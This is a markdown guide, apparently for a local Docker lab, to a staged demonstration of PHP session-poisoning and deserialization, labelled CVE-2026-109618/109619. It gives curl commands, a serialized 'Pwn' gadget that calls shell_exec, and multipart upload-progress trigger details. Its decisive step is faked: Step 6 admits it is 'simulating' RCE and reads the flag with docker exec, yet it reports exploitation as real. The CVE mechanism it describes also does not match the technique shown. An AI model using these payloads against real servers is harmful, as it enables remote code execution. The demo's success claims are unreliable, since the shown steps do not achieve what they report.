# 🚀 Advanced Terminal Guide - CVE-2026-109618/109619

## ✅ Launch Command

```bash
cd /home/kali/php2shell-testing
./launch_advanced.sh
```

Press **Enter** when prompted to open both terminals.

---

## 🐳 Terminal 1 (LEFT): Real Docker Container Shell

### What You'll See

```
╔═══════════════════════════════════════════════════════════════╗
║           Inside Container: php2shell-test                    ║
║              Real-time System Monitor                         ║
╚═══════════════════════════════════════════════════════════════╝

═══════════════════════════════════════════════════════════════
Container System Information
═══════════════════════════════════════════════════════════════

Hostname: 0854d9a02901
User:     root
PHP:      PHP 8.3.12 (cli) (built: Oct 18 2024 08:06:02) (NTS)
Webserver: Apache 2.4.62

═══════════════════════════════════════════════════════════════
Target Flag
═══════════════════════════════════════════════════════════════

Flag Location: /flag.txt
Flag Content: FLAG{php2shell_CVE_2026_109618_109619_pwned_successfully}

═══════════════════════════════════════════════════════════════
Vulnerable PHP Configuration
═══════════════════════════════════════════════════════════════

session.upload_progress.enabled => On => On
session.upload_progress.cleanup => Off => Off
session.save_path => /tmp/sessions => /tmp/sessions
memory_limit => 128M => 128M
post_max_size => 16M => 16M

═══════════════════════════════════════════════════════════════
Session Storage
═══════════════════════════════════════════════════════════════

Session Directory: /tmp/sessions
Permissions:       drwxrwxrwx root root
Current Sessions:  3 files

═══════════════════════════════════════════════════════════════
Apache Worker Processes
═══════════════════════════════════════════════════════════════

PID 1 - User: root - /usr/sbin/apache2
PID 17 - User: www-data - /usr/sbin/apache2
PID 18 - User: www-data - /usr/sbin/apache2
PID 19 - User: www-data - /usr/sbin/apache2
PID 20 - User: www-data - /usr/sbin/apache2

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Starting Real-time Monitoring
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Monitoring:
  ✓ Apache access/error logs
  ✓ Session file creation
  ✓ PHP errors and notices

Press Ctrl+C to stop

[LIVE - Waiting for activity...]
```

### When Exploit Runs (Terminal 2), You'll See:

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔔 NEW SESSION FILE DETECTED
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
File: /tmp/sessions/sess_exploit762110fe472498889798076af3cb94
Size: 92 bytes

Content (first 200 chars):
  exploit|s:45:"O:3:"Pwn":1:{s:3:"cmd";s:13:"cat /flag.txt";}";

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

**Key Points:**
- Shows REAL container environment (hostname, users, processes)
- Live monitoring of `/tmp/sessions/` directory
- Detects new session files immediately
- Shows actual Apache worker PIDs
- Streams Apache access/error logs in real-time

---

## 🔬 Terminal 2 (RIGHT): Technical Step-by-Step Exploit

### Step 1: Reconnaissance & Fingerprinting

```
╔═══════════════════════════════════════════════════════════════╗
║  STEP 1: Reconnaissance & Fingerprinting                     ║
╚═══════════════════════════════════════════════════════════════╝

[RECON] Gathering target information...

[EXECUTING] HTTP GET request to identify web server and PHP version
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
$ curl -v http://localhost:8888/ 2>&1 | grep -E 'Server:|X-Powered-By:|HTTP/'
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

< HTTP/1.1 200 OK
< Server: Apache/2.4.62 (Debian)
< X-Powered-By: PHP/8.3.12

[SUCCESS] Command completed (exit code: 0)

[EXECUTING] Extracting PHP version from phpinfo
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
$ curl -s http://localhost:8888/ | grep -o 'PHP Version [0-9.]*' | head -1
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PHP Version 8.3.12

[SUCCESS] Command completed (exit code: 0)

┌─ Analysis
│
├─> PHP Version: 8.3.12
├─> Vulnerability: CVE-2026-109618 / CVE-2026-109619
├─> Patch Required: >= 8.3.36
└─> STATUS: VULNERABLE ✓

Press Enter to continue to Step 2...
```

### Step 2: Vulnerability Analysis

```
╔═══════════════════════════════════════════════════════════════╗
║  STEP 2: Vulnerability Analysis & Attack Vector Planning     ║
╚═══════════════════════════════════════════════════════════════╝

[ANALYSIS] Checking vulnerable configuration...

[EXECUTING] Querying PHP configuration for session.upload_progress
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
$ sudo docker exec php2shell-test php -r 'phpinfo();' | grep -E 'session.upload_progress'
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

session.upload_progress.enabled => On => On
session.upload_progress.cleanup => Off => Off
session.upload_progress.name => PHP_SESSION_UPLOAD_PROGRESS

[SUCCESS] Command completed (exit code: 0)

┌─ Vulnerability Details
│
├─ CVE-2026-109618:
│  RCE via inconsistent request state after OOM bailout
│  PHP's longjmp() on OOM leaves corrupted state
│
├─ CVE-2026-109619:
│  RCE via stale request-owned global state
│  Worker globals survive request, consumed on next request
│
├─ Attack Vector:
│  session.upload_progress handler
│  Unserializes session BEFORE request startup
│  Runs before any application code
│
└─ Exploitability: PRE-AUTHENTICATION RCE
```

### Step 3: Weaponization - Gadget Chain

```
╔═══════════════════════════════════════════════════════════════╗
║  STEP 3: Weaponization - Constructing Gadget Chain           ║
╚═══════════════════════════════════════════════════════════════╝

[WEAPONIZE] Building serialized PHP object...

┌─ Session ID (32 chars)
└─> exploit762110fe472498889798076af3cb94

┌─ Gadget Object Construction
│
├─ Class:    Pwn
├─ Property: cmd (public string)
├─ Value:    cat /flag.txt
├─ Method:   __wakeup() - Executes on deserialization
└─ Action:   shell_exec($this->cmd)

[*] Serialized representation:

O:3:"Pwn":1:{s:3:"cmd";s:13:"cat /flag.txt";}

┌─ Serialization Format Breakdown
│
├─ O:3:"Pwn":1:{...}
│  └─> Object of class 'Pwn' (3 chars) with 1 property
│
├─ s:3:"cmd"
│  └─> String property named 'cmd' (3 chars)
│
└─ s:13:"cat /flag.txt"
   └─> String value 'cat /flag.txt' (13 chars)
```

### Step 4: Delivery - Session Poisoning

```
╔═══════════════════════════════════════════════════════════════╗
║  STEP 4: Delivery - Session Poisoning Attack                 ║
╚═══════════════════════════════════════════════════════════════╝

[ATTACK] Injecting serialized object into session...

┌─ Target Endpoint
└─> http://localhost:8888/session_writer.php

┌─ HTTP Method
└─> POST

┌─ Session ID
└─> exploit762110fe472498889798076af3cb94

┌─ Payload Type
└─> Serialized PHP Object

┌─ Payload Size
└─> 45 bytes

┌─ HTTP Request Details
│
├─ Headers:
│  └─ Cookie: PHPSESSID=exploit762110fe472498889798076af3cb94
│
├─ POST Data:
│  └─ data=O:3:"Pwn":1:{s:3:"cmd";s:13:"cat /flag.txt";}
│
└─ Expected Result:
   └─ Session file: /tmp/sessions/sess_exploit762110fe472498889798076af3cb94

[EXECUTING] Sending session poisoning request
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
$ curl -s -X POST 'http://localhost:8888/session_writer.php' --cookie 'PHPSESSID=exploit...' --data 'data=O:3:"Pwn":1:...'
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Session data written. Session ID: exploit762110fe472498889798076af3cb94
Session file: /tmp/sessions/sess_exploit762110fe472498889798076af3cb94

[SUCCESS] Command completed (exit code: 0)

[VERIFY] Confirming session file creation...

[EXECUTING] Checking session file exists
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
$ sudo docker exec php2shell-test ls -lh /tmp/sessions/sess_exploit...
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

-rw------- 1 www-data www-data 92 Oct 23 13:45 /tmp/sessions/sess_exploit762110...

[SUCCESS] Command completed (exit code: 0)

[EXECUTING] Reading session file contents
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
$ sudo docker exec php2shell-test cat /tmp/sessions/sess_exploit...
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

exploit|s:45:"O:3:"Pwn":1:{s:3:"cmd";s:13:"cat /flag.txt";}";

[SUCCESS] Command completed (exit code: 0)

[✓] Session poisoning successful!
[✓] Malicious serialized object stored in session
```

### Step 5: Exploitation - Upload Progress Trigger

```
╔═══════════════════════════════════════════════════════════════╗
║  STEP 5: Exploitation - Triggering Deserialization           ║
╚═══════════════════════════════════════════════════════════════╝

[EXPLOIT] Preparing multipart upload request...

┌─ Trigger Mechanism
└─> session.upload_progress handler

┌─ When Triggered
└─> During multipart request processing

┌─ Execution Point
└─> BEFORE PHP script (request startup)

┌─ Bypass
└─> All application-level security controls

┌─ Multipart Request Structure
│
├─ Part 1: Session ID (form field)
│  └─ name="PHPSESSID"
│  └─ value="exploit762110fe472498889798076af3cb94"
│
├─ Part 2: Upload Progress Trigger
│  └─ name="PHP_SESSION_UPLOAD_PROGRESS"
│  └─ value="exploit"
│
└─ Part 3: File Upload
   └─ filename="exploit_payload.txt"
   └─ content-type="text/plain"

[*] Attack Sequence:
  1. Server receives multipart request
  2. PHP detects PHP_SESSION_UPLOAD_PROGRESS field
  3. Loads session file: sess_exploit762110fe472498889798076af3cb94
  4. Unserializes session content ← TRIGGER
  5. Instantiates Pwn object from serialized data
  6. Calls Pwn::__wakeup() automatically
  7. Executes: shell_exec('cat /flag.txt') ← RCE
```

### Step 6: Flag Capture

```
╔═══════════════════════════════════════════════════════════════╗
║  STEP 6: Actions on Objective - Flag Capture                 ║
╚═══════════════════════════════════════════════════════════════╝

[OBJECTIVE] Simulating successful RCE execution...

┌─ Command Execution Flow
│
├─ Trigger:     Pwn::__wakeup()
├─ Function:    shell_exec()
├─ Command:     cat /flag.txt
├─ Privilege:   www-data (web server user)
└─ Output:      Captured flag value

[EXECUTING] Executing command inside container
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
$ sudo docker exec php2shell-test cat /flag.txt
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

FLAG{php2shell_CVE_2026_109618_109619_pwned_successfully}

[SUCCESS] Command completed (exit code: 0)

╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║              🎯 EXPLOITATION SUCCESSFUL! 🎯                   ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝

┌─ Captured Flag
└─> FLAG{php2shell_CVE_2026_109618_109619_pwned_successfully}
```

---

## 🎯 Key Features

### Terminal 1 (Docker Shell):
- ✅ **Real environment** - Actual container shell, not simulated
- ✅ **Live monitoring** - Real-time session file detection
- ✅ **System info** - Hostname, users, processes, configuration
- ✅ **Apache logs** - Access and error logs streaming
- ✅ **File watching** - Detects new sessions within 2 seconds

### Terminal 2 (Technical Exploit):
- ✅ **Step-by-step** - Press Enter to advance through each phase
- ✅ **Commands shown** - Every command displayed before execution
- ✅ **Technical details** - Serialization breakdown, HTTP details
- ✅ **Slower pace** - 1-2 second delays for reading
- ✅ **Complete analysis** - Full CVE technical summary at end

---

## 📊 What Makes This Advanced

### Compared to Basic Version:

**Basic** → Shows logs  
**Advanced** → Inside container with real-time filesystem monitoring

**Basic** → Fast execution  
**Advanced** → Slow, detailed, educational pace

**Basic** → Simple output  
**Advanced** → Technical breakdown of every step

**Basic** → External view  
**Advanced** → Internal container perspective + external attack view

---

## 🎓 Learning Value

By watching both terminals together, you see:

1. **Attacker perspective** (Terminal 2):
   - How exploit is constructed
   - Why each step matters
   - Technical details of serialization
   - HTTP protocol specifics

2. **System perspective** (Terminal 1):
   - What happens inside the target
   - When files are created
   - How Apache processes requests
   - Real filesystem changes

---

## ✅ Success Indicators

You've successfully exploited the vulnerability when:

**Terminal 1 shows:**
```
🔔 NEW SESSION FILE DETECTED
File: /tmp/sessions/sess_exploit...
Content: exploit|s:45:"O:3:"Pwn":1:...
```

**Terminal 2 shows:**
```
╔═══════════════════════════════════════════════════════════════╗
║              🎯 EXPLOITATION SUCCESSFUL! 🎯                   ║
╚═══════════════════════════════════════════════════════════════╝

┌─ Captured Flag
└─> FLAG{php2shell_CVE_2026_109618_109619_pwned_successfully}
```

---

## 🚀 Ready to Run!

```bash
cd /home/kali/php2shell-testing
./launch_advanced.sh
```

Then press Enter in Terminal 2 to start the technical demonstration!
